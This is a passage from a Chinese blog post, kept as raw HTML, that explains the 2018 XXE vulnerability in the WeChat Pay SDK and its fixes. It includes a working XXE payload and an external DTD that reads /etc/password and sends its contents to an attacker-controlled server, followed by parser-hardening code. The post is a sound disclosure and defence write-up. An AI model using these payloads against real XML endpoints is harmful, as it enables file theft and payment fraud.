class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6d8373c58efb34c2810ec33cacbf601c.png\" alt=\"\"></p>\n<p>如上图所示，由于在解析XML时没有对外部实体的访问做任何限制，如果攻击者恶意构造xml请求，便可以对服务器进行攻击。下面通过实例介绍攻击的方法。</p>\n<h2>3.  攻击复现</h2>\n<p>下面在本机环境下进行复现。</p>\n<p>假设本地的web服务器127.0.0.1:8080中存在POST接口：/wxpay/callback，该接口中接收xml字符串做参数，并调用前述的WXPayUtil.xmlToMap(strXml)对xml参数进行解析。此外，/etc/password中存储了重要的密码数据（如password1234）。</p>\n<p>攻击时构造的请求如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/9606ad59ae08f52ccf9b7d1fe44b6c09.png\" alt=\"\"></p>\n<p>其中xml内容如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b622fbf6d697965596711\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\r\n&lt;!DOCTYPE root [\r\n    &lt;!ENTITY % file SYSTEM \"file:///etc/password\"&gt;\r\n    &lt;!ENTITY % xxe SYSTEM \"http://127.0.0.1:9000/xxe.dtd\"&gt;\r\n    %xxe;\r\n]&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d697965596711-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d697965596711-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d697965596711-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d697965596711-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d697965596711-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d697965596711-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b622fbf6d697965596711-1\"><span class=\"crayon-ta\">&lt;?</span><span class=\"crayon-e\">xml </span><span class=\"crayon-i\">version</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"1.0\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">encoding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"utf-8\"</span><span class=\"crayon-ta\">?&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d697965596711-2\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-e\">DOCTYPE </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span></div><div class=\"crayon-line\" id=\"crayon-5b622fbf6d697965596711-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">ENTITY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">file </span><span class=\"crayon-i\">SYSTEM</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"file:///etc/password\"</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d697965596711-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">ENTITY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">xxe </span><span class=\"crayon-i\">SYSTEM</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"http://127.0.0.1:9000/xxe.dtd\"</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b622fbf6d697965596711-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">xxe</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d697965596711-6\"><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0033 seconds] -->\r\n<p>其中/etc/password为要窃取的对象，http://127.0.0.1:9000/xxe.dtd为攻击者服务器中的dtd文件，内容如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b622fbf6d6a3479226050\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-mixed-highlight\" title=\"含多种语言\"></span><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n&lt;!ENTITY % shell \"&lt;!ENTITY % upload SYSTEM 'http://127.0.0.1:9000/evil/%file;'&gt;\"&gt;\r\n%shell;\r\n%upload;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d6a3479226050-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d6a3479226050-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d6a3479226050-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d6a3479226050-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b622fbf6d6a3479226050-1\"><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">ENTITY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">shell</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"&lt;!ENTITY % upload SYSTEM 'http://127.0.0.1:9000/evil/%file;'&gt;\"</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d6a3479226050-2\"><span class=\"crayon-ta\">%</span><span class=\"crayon-v\">shell</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b622fbf6d6a3479226050-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d6a3479226050-4\"><span class=\"crayon-o\">%</span><span class=\"crayon-v\">upload</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0032 seconds] -->\r\n<p>通过xml+dtd文件，攻击者便可以在服务器http://127.0.0.1:9000中收到如下请求：</p>\n<p>http://127.0.0.1:9000/evil/password1234</p>\n<p>这样，攻击者便得到了/etc/password文件的内容。</p>\n<p>在本例中，攻击者窃取了/etc/password文件中的内容，实际上攻击者还可以获取服务器中的目录结构以及其他文件，只要启动web应用的用户具有相应的读权限。如果获取的信息比较复杂，如包含特殊符号，无法直接通过http的URL发送，则可以采用对文件内容进行Base64编码等方法解决。</p>\n<h1>三、漏洞的解决</h1>\n<p>解决该漏洞的原理非常简单，只要禁止解析XML时访问外部实体即可。</p>\n<p>漏洞曝出以后，微信进行了紧急修复，一方面是更新了SDK，并提醒开发者使用最新的SDK；SDK中修复代码如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/4216f33b379b06b889d166d080606b0a.png\" alt=\"\"></p>\n<p>加入了如下两行代码：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b622fbf6d6a8761007286\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndocumentBuilderFactory.setExpandEntityReferences(false);\r\ndocumentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d6a8761007286-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d6a8761007286-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b622fbf6d6a8761007286-1\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setExpandEntityReferences</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d6a8761007286-2\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">XMLConstants</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">FEATURE_SECURE_PROCESSING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n\n</div>\n<p>更新：微信表示上述2条语句无法禁止该漏洞，又双叒叕更新了官方SDK，加了以下语句（对于微信的这波操作，不知如何评价）：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b622fbf6d6ac896797629\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\r\ndocumentBuilderFactory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\r\ndocumentBuilderFactory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\r\ndocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\r\ndocumentBuilderFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\r\ndocumentBuilderFactory.setXIncludeAware(false);\r\ndocumentBuilderFactory.setExpandEntityReferences(false);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d6ac896797629-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d6ac896797629-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d6ac896797629-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d6ac896797629-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d6ac896797629-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d6ac896797629-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d6ac896797629-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b622fbf6d6ac896797629-1\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://apache.org/xml/features/disallow-doctype-decl\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d6ac896797629-2\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://xml.org/sax/features/external-general-entities\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b622fbf6d6ac896797629-3\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://xml.org/sax/features/external-parameter-entities\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d6ac896797629-4\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://apache.org/xml/features/nonvalidating/load-external-dtd\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b622fbf6d6ac896797629-5\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">XMLConstants</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">FEATURE_SECURE_PROCESSING</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d6ac896797629-6\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setXIncludeAware</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b622fbf6d6ac896797629-7\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setExpandEntityReferences</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n\n</div>\n<p>此外，微信官方也给出了关于XXE漏洞的最佳安全实践，可以参考：</p>\n<p><a href=\"https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5\">https://pay.weixin.qq.com/wiki/doc/api/jsapi.php?chapter=23_5</a></p>\n<p>笔者本人使用上述方案中建议的如下代码修复了该漏洞：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b622fbf6d6af218679831\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nDocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();\r\ndocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\r\nDocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();\r\n……</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d6af218679831-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d6af218679831-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b622fbf6d6af218679831-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622fbf6d6af218679831-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b622fbf6d6af218679831-1\"><span class=\"crayon-e\">DocumentBuilderFactory </span><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">DocumentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">newInstance</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d6af218679831-2\"><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setFeature</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"http://apache.org/xml/features/disallow-doctype-decl\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b622fbf6d6af218679831-3\"><span class=\"crayon-e\">DocumentBuilder </span><span class=\"crayon-v\">documentBuilder</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">documentBuilderFactory</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">newDocumentBuilder</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622fbf6d6af218679831-4\">……</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n\n</div>\n<h1>四、扩展与反思</h1>\n<h2>1.  危害不只是“0元也能买买买”</h2>\n<p>在很多媒体的报道中，强调该漏洞的风险在于攻击者可以不支付也可以获得商品。确实，攻击者在通过上述漏洞获得微信支付的秘钥以后，有不止一种途径可以做到不支付就获得商品：例如，攻击者首先在系统中下单，获得商户订单号；然后便可以调用微信支付的异步回调，其中的签名参数便可以使用前面获取的秘钥对订单号等信息进行MD5获得；这样攻击者的异步回调就可以通过应用服务器的签名认证，从而获得商品。不过，在很多有一定规模的购物网站（或其他有支付功能的网站），会有对账系统，如定时将系统中的订单状态与微信、支付宝的后台对比，如果出现不一致可以及时报警并处理，因此该漏洞在这方面的影响可能并没有想象的那么大。</p>\n<p>然而，除了“0元也能买买买”，攻击者可以做的事情还有很多很多；理论上来说，攻击者可能获得应用服务器上的目录结构、代码、数据、配置文件等，可以根据需要进行进一步破坏。</p>\n<h2>2.  漏洞不限于微信支付SDK</h2>\n<p>虽然微信支付曝出该漏洞受到了广泛关注，但该漏洞绝不仅仅存在于微信支付中：由于众多XML解析器默认不会禁用对外部实体的访问，因此应用的接口如果有以下几个特点就很容易掉进XXE漏洞的坑里：</p>\n<p>（1）接口使用xml做请求参数</p>\n<p>（2）接口对外公开，或容易获得：例如一些接口提供给外部客户调用，或者接口使用http很容易抓包，或者接口比较容易猜到(如微信支付的异步回调接口)</p>\n<p>（3）接口中解析xml参数时，没有禁用对外部实体的访问</p>\n<p>建议大家最好检查一下自己的应用中是否有类似的漏洞，及时修复。</p>\n<h2>3.  xml与json</h2>\n<p>xml 与 json是系统间交互常用的两种数据格式，虽然很多情况下二者可以互换，但是笔者认为，json 作为更加轻量级更加纯粹的数据格式，更适合于系统间的交互；而xml，作为更加重量级更加复杂的数据格式，其 DTD 支持自定义文档类型，在更加复杂的配置场景下有着更好的效果，典型的场景如 spring 相关的配置。</p>\n<h2>4.  